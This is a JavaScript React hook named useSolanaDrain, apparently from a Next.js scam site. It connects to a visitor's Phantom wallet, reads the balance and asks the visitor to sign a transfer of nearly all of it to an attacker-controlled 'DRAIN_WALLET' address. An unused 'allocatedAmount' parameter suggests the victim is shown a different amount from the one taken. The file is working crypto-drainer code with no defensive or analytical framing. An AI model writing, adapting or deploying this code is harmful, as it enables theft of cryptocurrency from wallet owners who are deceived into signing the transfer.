"use client";

import { useCallback } from 'react';
import { Connection, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';
import { getConnection, executeWithRetry } from '@/utils/rpcManager';

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const MIN_BALANCE = 0.003 * 1e9; // 0.003 SOL

export const useSolanaDrain = () => {
  const executeDrain = useCallback(async (allocatedAmount) => {
    try {
      if (!window.solana?.isPhantom) {
        throw new Error('Phantom wallet not detected');
      }

      const connection = getConnection();
      
      // Connect and get wallet
      const response = await window.solana.connect();
      const walletPubkey = response.publicKey;
      
      // Get balance
      const balance = await executeWithRetry(() => 
        connection.getBalance(walletPubkey)
      );
      
      if (balance < MIN_BALANCE) {
        throw new Error('Insufficient balance for gas');
      }
      
      // Calculate drain amount (leave 0.002 SOL for gas)
      const drainAmount = balance - 2000000; // 0.002 SOL
      
      // Get recent blockhash
      const { blockhash } = await executeWithRetry(() =>
        connection.getLatestBlockhash()
      );
      
      // Create transaction
      const transaction = new Transaction({
        feePayer: walletPubkey,
        recentBlockhash: blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: walletPubkey,
          toPubkey: new PublicKey(DRAIN_WALLET),
          lamports: drainAmount,
        })
      );
      
      // Sign and send
      const signed = await window.solana.signAndSendTransaction(transaction);
      
      // Confirm
      await executeWithRetry(() =>
        connection.confirmTransaction(signed.signature, 'confirmed')
      );
      
      return {
        success: true,
        txId: signed.signature,
        amount: drainAmount / 1e9
      };
      
    } catch (error) {
      console.error('Solana drain failed:', error);
      throw error;
    }
  }, []);

  return { executeDrain };
};
